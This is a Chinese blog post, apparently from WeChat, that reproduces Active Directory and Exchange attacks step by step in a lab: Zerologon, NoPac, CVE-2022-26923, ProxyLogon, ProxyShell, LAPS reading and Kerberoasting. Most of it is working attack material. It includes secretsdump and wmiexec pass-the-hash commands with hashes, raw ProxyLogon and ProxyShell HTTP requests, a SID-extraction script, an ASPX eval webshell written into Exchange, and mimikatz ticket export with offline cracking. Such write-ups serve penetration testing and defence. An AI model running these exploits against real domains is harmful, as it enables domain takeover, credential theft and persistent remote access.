<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0K3cFFABY7PsK6VFg2yLLA)

0x01 前言
-------

看见 **M01N Team** 公众号发布了一篇名字为`《2023攻防应知应会｜发布！细数Active Directory域攻击面十大安全风险》`的文章。

```
https://mp.weixin.qq.com/s/-n8XYwQ2fKYzqAyp353j4g


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFkWHhbeyeBuLwQOXv8YJWZxewMpOosaiaYPLDkqiclukBa11fn0iavLG9w/640?wx_fmt=png)

那么就让我们来复现一下具体的技术操作流程

0x02 AD DS 漏洞
-------------

### 1. Zerologon（CVE-2020-1472）

最知名的莫过于 **Zerologon（CVE-2020-1472）** 该漏洞，攻击者只需能够访问域控的 445 端口，在无需任何凭据的情况下能拿到域管的权限。该漏洞的产生来源于 **Netlogon 协议**认证的加密模块存在缺陷，导致攻击者可以在没有凭证的情况情况下通过认证。该漏洞的最稳定利用是调用 netlogon 中 RPC 函数 NetrServerPasswordSet2 来重置域控的密码，从而以域控的身份进行 Dcsync 获取域管权限。

Netlogon 远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFKVZZkQJLKhbAmPjbwPic1NTicaR3mAe20RMjuBJx5YdlNtSN7rib5udHA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFJBqQSZeFvohuTz4PxFCUZeZ6Isoibm7lmO9Ww9pulFpPS6OoVuKlgTg/640?wx_fmt=png)

那么我们开始实战，首先直接通过`net view`等操作定位域控！已知域控地址为 10.10.10.10（DC）。那么我们开始使用 **攻击机器 (10.10.10.111)** 进行实验。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFvvRFgAmCeWnhCKYwa10N8u9PVEElPtcd5mFTToQwUtEiaHuUB3QyXAA/640?wx_fmt=png)此时我们的 Zerologon 漏洞已经试验成功，已成功将 DC 域控的密码置空。那么我们来导出域内所有用户的凭证

```
python3 secretsdump.py de1ay/DC\$@10.10.10.10 -no-pass


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewF3ibZwBRnY8uBSfica82hPnXpQxEF0gc1q08hTYdP44gLoHUe72tnUtGA/640?wx_fmt=png)

找到 DC 的 Hash 为`31d6cfe0d16ae931b73c59d7e0c089c0`等相关的 Administrator 的 Hash。那么我们就可以通过 wmiexec 对域控进行横向

```
python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 Administrator@10.10.10.10


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFibx0Mma4q7yBttjNRiaz0PiaA4TPiasznEYYyPXA8mcjv2TEtoS6E2eWuA/640?wx_fmt=png)

### 2. NoPac (CVE-2021-42278 & CVE-2021-42287)

**CVE-2021-42278 :** 机器用户应当是 computer 的形式，但是实际并没有验证机器账号是否有。导致机器用户名可以被模拟冒用。

**CVE-2021-42287 :** Kerberos 在处理 UserName 字段时，如果找不到 UserName 的话，KDC 会继续查找 UserName$，如果还是查找不到的话，KDC 会继续查找 altSecurityIdentities 属性的值的⽤户。正是因为这个处理逻辑，导致了漏洞的产⽣。触发这个点有两种方式

*   跨域请求：跨域请求时，⽬标域活动⽬录数据库是找不到其他域的⽤户的，因此会⾛进这个 处理 UserName 的逻辑。
    
*   修改 saMAccountName 属性：在当前域，可以通过修改 saMAccountName 属性让 KDC 找不到⽤户，然后⾛进这个处理 UserName 的逻辑。
    

但是这还是不够，仅仅让 KDC ⾛进这个处理 UserName 的逻辑，还不能伪造⾼权限。因为票据中代表⽤户身份权限是数据块是 PAC。⽽ TGT 认购权证中的 PAC 是根据预认证身份信息⽣成的，这个我们⽆法伪造。因此得想办法在 ST 服务票据中进⾏伪造。⽽正常的 ST 服务票据中的 PAC 是直接拷⻉ TGT 认购权证中的。因此，得想办法让 KDC 在 TGS-REP 的时候重新⽣成 PAC，⽽不是拷⻉ TGT 票据中的 PAC。这⾥也有两种⽅式：

*   S4U2Self 请求：KDC 在处理 S4U2Self 类型的 TGS-REQ 请求时，PAC 是重新⽣成的。
    
*   跨域⽆ PAC 的 TGT 票据进⾏ TGS 请求：KDC 在处理跨域的 TGS-REQ 请求时，如果携带的 TGT 认购权证中没有 PAC，PAC 会重新⽣成。
    

```
# 常规流程
1.首先创建一个机器账户
2.清除机器账户的servicePrincipalName属性
3.将机器账户的sAMAccountName修改为DC的机器账户名，但不带$
4.使用机器账户的身份请求TGT
5.将机器账户的sAMAccountName修改为其他值，不能与DC的机器账户名重复。
6.通过S4U2Self向KDC申请ST
7.拿到高权限ST票据，完成利用。


```

这里我们使用自动化进行 NoPac 攻击。

```
https://github.com/cube0x0/noPac (自行编译)


```

```
./noPac.exe -domain attack.local -user Administrator -pass '1qaz@WSX' /dc dc.de1ay.com
/mAccount test /mPassword password123 /service cifs /ptt


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewF84ayufu7VSKZFJGUQfPXu9YQeibEicPBfnhN8ANSLpr8iaxxB2VqASHibQ/640?wx_fmt=png)

0x03 AD CS 脆弱性
--------------

### 1. CVE-2022-26923

当 Windows 系统的 Active Directory 证书服务（CS）在域上运行时，由于机器账号中的 dNSHostName 属性不具有唯一性，域中普通用户可以将其更改为高权限的域控机器账号属性，然后从 Active Directory 证书服务中获取域控机器账户的证书，导致域中普通用户权限提升为域管理员权限。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFQR1XQS3Xeyxian4WwG2EVK5ZshNDDesmQs8qCrCdzFAPdxoX1icRgL8A/640?wx_fmt=png)

**[Ps: 由于环境问题这里我就 COPY 其他人的内容]**

我们使用低权限账户去申请一个证书

```
certipy req jiacheng.com/'atree:Pass123'@WIN-VU69RG1VN5G.jiacheng.com -ca jiacheng-WIN-VU69RG1VN5G-CA -template User -debug


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewF96mRN4choCJYibaoUpGEicxowS6ickO8Gvp7TDZ7iaWUKjq6mYHWKLhJUg/640?wx_fmt=png)

通过证书成功获取 atree 的哈希值

```
certipy auth -pfx atree.pfx -debug


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFMbIB8PD1FcJIZN9zUaqQa1GQuyLvpKSYibenUPAu7p6ibBvLGpddXANQ/640?wx_fmt=png)

接着我们在创建一个机器账户

```
certipy account create jiacheng.com/'atree:Pass123'@WIN-
VU69RG1VN5G.jiacheng.com -user 'atreePC' -dns "WIN-
VU69RG1VN5G.jiacheng.com"


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFRjRA5V3MpqG1jo2yQZssBIuHdsavqGHMBzqdUbBFiac9hCseeekC6jg/640?wx_fmt=png)

使用申请的机器账户获取证书

```
certipy req jiacheng.com/'atreePC$:xCZTZzZbnt7uAHJL'@WIN-VU69RG1VN5G.jiacheng.com -ca jiacheng-WIN-VU69RG1VN5G-CA -template Machine -debug


```

证书是域控主机的证书，通过机器账户的证书获的 hash

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFS0ic2K6rPQkfZKsBkdibdvhEeGa69stnAzNibT9rMrnrt1Q7r9m1GkEvw/640?wx_fmt=png)

```
certipy auth -pfx win-vu69rg1vn5g.pfx


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFJ7X3LEymKeSLSUP6FvFdJUp3WVcg7YMhI19L45Vrm10otJs86Cj2tA/640?wx_fmt=png)

接着我们利用`secretsdump.py`来 dump 全部的 hash

```
secretsdump.py 'jiacheng.com/win-vu69rg1vn5g$@win-vu69rg1vn5g.jiacheng.com' -hashes 2ed156932fe310afa24d377e8cbfb333:2ed156932fe310afa24d377e8cbfb333


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFde7QxCKOqicrWcYibLRWNPspe3xzkYiacD0iaZXSs2B2YRiboLzkCcXm88A/640?wx_fmt=png)

拿到这些内容之后直接使用`wmiexec.py`进行横向

```
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4 ADMINISTRATOR@192.168.30.10


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFmoRSMcKlVbItTxQviaI0jqUjmTVUwTL26NkLof1RT4nJO36icdqdIUKQ/640?wx_fmt=png)

0x04 Exchange 漏洞
----------------

### 1. ProxyLogon

ProxyLogon 是 CVE-2021-26855 的名称, 它是一个存在于 Microsoft Exchange Server 的漏洞，可以使攻击者绕过身份验证并模拟用户。在观察到的攻击中，威胁行动者使用该漏洞去访问本地 Excange 服务器，从而可以访问邮箱账号，并且安装了其他恶意软件对受害机器进行长期的控制。

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFiaeicB0ibkOWb8DHgooL3sFn3aicmLrAzWiaUA1zKmPo2E23wOP6jW5gfPg/640?wx_fmt=png)

##### 影响范围

*   Exchange Server 2019 < 15.02.0792.010
    
*   Exchange Server 2019 < 15.02.0721.013
    
*   Exchange Server 2016 < 15.01.2106.013
    
*   Exchange Server 2013 < 15.00.1497.012
    

通过 SSRF 漏洞攻击, 访问 autodiscover.xml 泄露 LegacyDN 信息, 在通过 LegacyDN, 获取 SID, 然后通过合法的 SID, 获取 exchange 的有效 cookie, 最后通过有效的 cookie, 对 OABVirtualDirectory 对象进行恶意操作，写入一句话木马

**ProxyLogon** 是通过利用 CVE-2021-26855 SSRF 漏洞，然后使用 CVE-2021-27065 任意文件写入漏洞组合进行利用。

SSRF 是因为请求包中的 cookie 中 X-BEResource

存在漏洞主机会有 X-FEServer 和 X-CalculatedBETarget 两个 cookie。其中需要 X-FEServer 的信息进行进一步利用

```
GET /ecp/fd45ea.png HTTP/2
Host: 192.168.56.174
Cookie: X-BEResource=localhost~1942062522;


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFGPYWSl8cYdQHLrOlf2MrEXJOzQjPdb4OaWIbbMP6Qyp6Fib9V9ty1Hw/640?wx_fmt=png)

确认响应头包含这两个字段就可以获取 LegacyDN

```
https://192.168.56.174/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3f@foo.com


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewF7siaNR7uvDiahwRicjjHYuOXP34iaqG9x82iaFib4ZIez0FTpo7JdOZS9JPA/640?wx_fmt=png)

通过我们拿到的 win-93uimouupn7.xiaozhang.com 来获得 LegacyDN

```
POST /ecp/xz.js HTTP/2
Host: 192.168.56.174
Cookie: X-BEResource=win-93uimouupn7.xiaozhang.com/autodiscover/autodiscover.xml?a=~1942062522;
Content-Type: text/xml
Content-Length: 379


    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>administrator@域名</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover> 


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFL2e5M4xdrC3yHUYYcSVWAVZ1hx7X4uicHP4g286cuoacqQUfBKGjzGg/640?wx_fmt=png)

那么我们接下来就可以获取获取 SID。这里为了方便直接使用脚本获取 **SID**

```
import requests

legacyDn = '/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=7ecc15e6f7854cd89342bba49f33cb19-Admin'
mapi_body = legacyDn + \
            "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
print(mapi_body)
ct = requests.post("https://192.168.56.174/ecp/xz.js", headers={
    "Cookie": "X-BEResource=Administrator@win-93uimouupn7.xiaozhang.com:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;",
    "Content-Type": "application/mapi-http",
    "X-Requesttype": "Connect",
    "X-Clientapplication": "Outlook/15.0.4815.1002",
    "X-Requestid": "x"
},
                   data=mapi_body,
                   verify=False,
                   )
if ct.status_code != 200 or "act as owner of a UserMailbox" not in str(ct.content):
    print("Mapi Error!")
    exit()

sid = str(ct.content).split("with SID ")[
    1].split(" and MasterAccountSid")[0]

print("Got SID: " + sid)
sid = sid.replace(sid.split("-")[-1], "500")



```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFwSdumJbzZZMhbTBYqNRay5Sq3ULnh9H7wYtahiaBOoR1PYTjb3oHPjg/640?wx_fmt=png)

既然我们现在有了 SID 值就可以开始获取 Cookie

```
POST /ecp/xz.js HTTP/2
Host: 192.168.56.174
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 
Accept-Encoding: gzip, deflate
Accept: */*
Cookie: X-BEResource=Administrator@win-93uimouupn7.xiaozhang.com:444/ecp/proxyLogon.ecp?a=~1942062522;
Content-Type: text/xml
Msexchlogonmailbox: S-1-5-20
Content-Length: 93

<r at="NTLM" ln="Administrator"><s t="0">S-1-5-21-3999964583-919065085-2198410999-500</s></r>


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFQ7icvBpgmuFyBtNreATnianvM6USQWdmP1GLCX6jpdJHUDrGdh0Ax8sA/640?wx_fmt=png)

既然我们拿到管理员权限的账号的那就可以开始组合漏洞了 **(CVE-2021-27065 任意文件写入漏洞)**

我们可以编辑 **OAB 配置**中的外部 URL 来写入木马

```
http://aaa/<script language="JScript" runat="server">function Page_Load(){eval(Request["orange"],"unsafe");}</script>


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFKyAvVic1rV2xWNla48pNtWlKiarE09rzMv1mosOrtYJtx9X0nJv32fiaA/640?wx_fmt=png)

默认地址为：**'\127.0.0.1\c$\inetpub\wwwroot\aspnet_client\xz.aspx'**

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFlrCyqibLcF6UnEwwC3BazevaxHJxdywxHbWcV5HSqlTDdibsutfVSsnA/640?wx_fmt=png)

重置之后我们可以直接访问 **'/aspnet_client/xz.aspx?orange='**

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFV6kF43TKZvUcj73vTB7LzKMSqw1TD3qrUAeqLZIS9topGJus51FKRA/640?wx_fmt=png)

### 2. ProxyShell

利用 CVE-2021-34473 这个 SSRF 漏洞可以绕过 Exchange 的身份验证并访问到后端的敏感信息，结合先前的 SSRF 漏洞，可以利用 CVE-2021-34523 提权漏洞向后端的 / powershell 端点发送 Exchange Powershell 命令并执行，利用 CVE-2021-31207 任意文件写入漏洞写入木马文件，其允许攻击者导出邮件内容到指定的路径。

主要利用思路：利用 Exchange 服务器对于路径的不准确过滤导致的路径混淆生成的 SSRF，进而使攻击者通过访问 PowerShell 端点。而在 PowerShell 端点可以利用 Remote PowerShell 来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出 webshell，从而达成命令执行。[来自互联网]

##### 影响范围

*   Microsoft Exchange Server 2010
    
*   Microsoft Exchange Server 2013
    
*   Microsoft Exchange Server 2016
    
*   Microsoft Exchange Server 2019
    

获取到 LegacyDN 的方式与 ProxyLogon 类似

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFCkRspicKiavfEPYa6zNOrvjMmkBI48ROknktDs8gicZzRBDTpYK2EBaMw/640?wx_fmt=png)

这里我们可以直接使用脚本

```
https://github.com/dmaasland/proxyshell-poc


```

直接使用脚本获得 SID 值以及 Token！将生成的 token 通过 **X-CommonAccessToken** 进行利用

```
GET /autodiscover/autodiscover.json?a=administrator@xiaozhang.com/powershell/?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBthZG1pbmlzdHJhdG9yQHhpYW96aGFuZy5jb21VLFMtMS01LTIxLTM5OTk5NjQ1ODMtOTE5MDY1MDg1LTIxOTg0MTA5OTktNTAwRwEAAAAHAAAADFMtMS01LTMyLTU0NEUAAAAA HTTP/2
Host: 192.168.56.174
Accept-Encoding: identity
Cookie: Email=autodiscover/autodiscover.json?a=administrator@xiaozhang.com
Content-Type: application/soap+xml;charset=UTF-8
Content-Length: 0


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFeutGla0VQkddPPD8OZeWbNk186umeAOjSicpiaBgEhJb0iao95erjuerw/640?wx_fmt=png)

响应值为 200，证明我们可以开始利用 Powershell 来执行命令。

```
如何利用Powershell执行命令
# 参考文章：
https://github.com/izj007/wechat/blob/main/articles/%5BTimeline%20Sec%5D-2021-8-25-Exchange%20ProxyShell%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.md


```

```
POST /autodiscover/autodiscover.json?a=administrator@xiaozhang.com/EWS/exchange.asmx/?X-Rps-CAT=VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBthZG1pbmlzdHJhdG9yQHhpYW96aGFuZy5jb21VLFMtMS01LTIxLTM5OTk5NjQ1ODMtOTE5MDY1MDg1LTIxOTg0MTA5OTktNTAwRwEAAAAHAAAADFMtMS01LTMyLTU0NEUAAAAA HTTP/2
Host: 192.168.56.174
Cookie: Email=autodiscover/autodiscover.json?a=administrator@xiaozhang.com
Content-Length: 1442
Content-Type: text/xml

<soap:Envelope
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Header>
<t:RequestServerVersion Version="Exchange2016"/>
<t:SerializedSecurityContext>
<t:UserSid>S-1-5-21-3999964583-919065085-2198410999-500</t:UserSid>
<t:GroupSids>
<t:GroupIdentifier>
  <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
</t:GroupIdentifier>
</t:GroupSids>
</t:SerializedSecurityContext>
</soap:Header>
<soap:Body>
<m:CreateItem MessageDisposition="SaveOnly">
<m:Items>
<t:Message>
  <t:Subject>aomenshoujiaxianshangduchang</t:Subject>
  <t:Body BodyType="HTML">hello fromdarkness side</t:Body>
  <t:Attachments>
    <t:FileAttachment>
      <t:Name>FileAttachment.txt</t:Name>
      <t:IsInline>false</t:IsInline>
      <t:IsContactPhoto>false</t:IsContactPhoto>
      <t:Content>ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoI5uanf2jmp1mlU041pqRT/FIb32tld9wZUFLfTBjm5qd/aKSDTqQ2MyenapanNjL7aXPfa1hR+glSNDYIPa4L3BtapXdqCyTEhlfvWVIa3aRTZ</t:Content>
    </t:FileAttachment>
  </t:Attachments>
  <t:ToRecipients>
    <t:Mailbox>
      <t:EmailAddress>administrator@xiaozhang.com</t:EmailAddress>
    </t:Mailbox>
  </t:ToRecipients>
</t:Message>
</m:Items>
</m:CreateItem>
</soap:Body>
</soap:Envelope>


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFiax73Gm95Gg4Q6cj6pSocjXPlDFgs8AJzUJglia1VEnKkNOmt9NVSQibw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFkRSTq68ebZVfceM6DOpYEOjgrsIHmJZzYd7Ziby9ibt4odefQY5QQd6Q/640?wx_fmt=png)

这里调用 exchange powershell 接口，将邮件保存到本地中，这里就涉及到 WsMan 协议

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewF8wg9aHaPWD9KDlsQyqpnMJPjSXa5W5jmcuCmY37Z7xbtp8c5wiaGzEw/640?wx_fmt=png)

为了方便，我们直接使用前面提及到的脚本即可

*   **https://github.com/dmaasland/proxyshell-poc**
    

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFQxVrNZ6kn0OZWeUcic3DA829Zf1O9ytaoibic8Vz2UEic2gg2HCllngWLw/640?wx_fmt=png)

0x05 登录非域控的域管理员
---------------

### 1. Local Administrator Password Solution

将本地管理员密码存储在 LDAP 上，作为计算机账户的一个机密属性，配合 GPO，实现自动定期修改密码、设置密码长度、强度等，然后配置某些指的账号，能查看存储的密码。

如果用户需要，可以用 PowerShell 或指的工具查询密码，但对非授权用户，却无法获取，从而实现本机管理员的自动化管理。

LAPS 使用两个 LDAP 属性来存储本地管理员凭证，这两个属性分别是 ms-MCS-AdmPwd（存储密码）和 ms-MCS-AdmPwdExpirationTime（存储过期时间）。

**LAPS 工作原理**

LAPS 解决方案的核心是 GPO 客户端扩展 (CSE)，它执行以下任务，并可以在 GPO 更新期间强制执行以下操作：检查本地管理员帐户的密码是否已过期。当旧密码过期或需要在过期前更改时，它会生成新密码。它根据密码策略验证新密码。它将密码报告给 Active Directory，并将其与计算机帐户一起以机密属性存储在 Active Directory 中。它还向 Active Directory 报告密码的下一个到期时间，并将其与计算机帐户的属性一起存储在 Active Directory 中。它还可以更改管理员帐户的密码。然后，有权执行此操作的用户可以从 Active Directory 中读取密码。

如果**配置不当**，我们可以在域内一台普通主机，查看域内其他主机本地管理员账号的密码。

[PS: 由于环境有限，故这节内容复制于互联网 (侵权联系删除)]

```
# 项目地址：
https://github.com/swisskyrepo/SharpLAPS/releases


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFvI7QQl7SrWseYAxp55YfmroEibzfx1Wzo8lvrFJ6n1QkTLibF8JKyH2g/640?wx_fmt=png)

也可以通过 Powershell (图片复制于跳跳糖社区 **tttang.com**)

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFEFiaEEvJSFR1M0e3NFJxZwzKrUibMZgRWAicLmztSmJ1t2BOFJFde6z1A/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFjKDof2EibWic1CtLqzFW6jCkyWCl1icLsA3FUKJsG9Hqc61LE1D3aljuQ/640?wx_fmt=png)

0x06 Kerberoastable 管理用户
------------------------

#### 1. Kerberoasting 离线破解

Kerberos 协议分为两个主要阶段：

*   认证服务交换（AS-REQ/AS-REP）
    
*   票据授权服务交换（TGS-REQ/TGS-REP）
    

Kerberos 协议涉及三个主要参与者：

*   客⼾端（⽤⼾）
    
*   服务
    
*   密钥分发中⼼（KDC）
    

Kerberoasting 攻击在实战中分为 4 步：

*     
    

1.  查询域内注册于域⽤⼾下的 SPN
    

*     
    

2.  请求指定 SPN 的 ST
    

*     
    

3.  导出请求的 ST
    

*     
    

4.  对导出的 ST 进⾏离线爆破
    

首先我们先注册 SPN（域管理员给 asd ⽤⼾注册 spn）

```
setspn.exe -L asd
setspn.exe -s http/testserver asd


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFM9B3zZtXzibYticy3l4eEmaEo9NA7D03vEwOQlTLHBibYmZogicibg9dFibw/640?wx_fmt=png)

我们可以使用脚本工具 PowerView 来发现

**https://github.com/PowerShellMafia/PowerSploit/tree/master PowerView.ps1**

PowerView 是 PowerSpolit 中 Recon ⽬录下⼀个 powershell 脚本，可⽤于查询过滤出域⽤⼾下注册 SPN 的用户，包括 krbtgt 用户，并返回用户详细信息。

```
Import-Module .\PowerView.ps1
Get-NetUser -spn


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFmhuZnTBCYDaFo4AGe1g7KcEpSD1vFkHNNHnpr2rofsHtsWX7kKibc7g/640?wx_fmt=png)

当过滤出注册在⽤⼾下的 SPN 之后，就可以请求这些 SPN 服务票据。

使⽤ mimikatz 请求指定 SPN 票据，保存在内存当中

```
# 请求所有SPN服务票据
mimikatz.exe "kerberos::list /export" "exit"

# 请求单个账⼾SPN服务票据
mimikatz.exe "kerberos::ask /target:"http/testserver" /service:http /user:asd
/domain:SHANGHAI.XIE.COM" "exit"


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFUVhO91ibyP9fsLibgsz6bksMZHtL35qKDbcUykoDYLYdZBFNyKwicB0fQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFLK1Cic9O59SEWb2W9mUcoyX8iclauAZDoClIiaMAGiac1p9yY1gcYIOvJg/640?wx_fmt=png)

请求服务票据过程中，可以直接打印保存到⽂件，有的会保存在内存中，对于内存中的票据，可以⽤ ⼯，让票据从内存中导出到⽂件。

```
# cmd窗⼝执⾏
klist

# mimikatz执⾏
mimikatz.exe "kerberos::list" "exit"

# 在同⽬录下导出 .kirbi格式票据⽂件
mimikatz.exe "kerberos::list /export" "exit"


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewFkON0BnsXwibT1hot6BzLf7hlG0QI4M7lYTVK5T1pNYjhRnSJBqD7icibg/640?wx_fmt=png)

目前我们取得了 **.kirbi** 票据⽂件或者 **hashcat**，john 能直接破解的⽂件，接下来就需要本地离线破 解服务票据。使用到一个工具名字为：**kerberoast**

**https://github.com/nidem/kerberoast**

Kerberoast ⽤于攻击 kerberos 试试先的⼀些⼯具集合，该⼯具中 tgsreocrack.py 脚本对 mimikatz 导出的 **.kirbi 票据** 进⾏爆破。

```
python3 tgsrepcrack.py pass.txt 2-40810000-asd@http\~testserver-SHANGHAI.XIE.COM.kirbi


```

![](https://mmbiz.qpic.cn/mmbiz_png/icefLCXrhxfgp6OTRAV6boicrQdeFONewF4bzXXNXfpJAYwsqqbQV7ia0BudyeaI7U1Kbp80YUUlUyuKdEfibicxHQQ/640?wx_fmt=png)

0x07 结尾
-------

有些小部分内容由于环境问题，图片是来自于互联网的。这篇上我就写 M01N Team 发布的内容的前五个技术，争取在国护结束之前发布后五个技术。

如有商务合作、技术交流，欢迎添加下方我的微信

![](https://mmbiz.qpic.cn/mmbiz_jpg/icefLCXrhxfgp6OTRAV6boicrQdeFONewFSSYzuC8LYsM9hOrv3K6qVeUCUgoEZmfReVGJIjL6o9BE6MZAGEO87g/640?wx_fmt=jpeg)

```
# 参考链接

https://www.se7ensec.cn/2021/03/12/%E5%9F%9F%E6%B8%97%E9%80%8F-ZeroLogon%E7%9A%84%E5%88%A9%E7%94%A8/
https://systemweakness.com/use-nopac-cve-2021-42278-cve-2021-42287-when-you-don-t-know-the-exploited-user-s-cleartext-e5207fc348e3
https://www.jianshu.com/p/1f30e0495cba
https://tttang.com/archive/1613/
https://saucer-man.com/information_security/748.html#cl-9
https://mp.weixin.qq.com/s/EnYnMKwr_UGK-3pAFjwHcQ
https://ucasers.cn/%E5%AF%B9ProxyLogon%E5%92%8CProxyShell%E7%9A%84%E5%A4%8D%E7%8E%B0%E8%B0%83%E8%AF%95/#title-8
https://tttang.com/archive/871/#toc_3powershell


```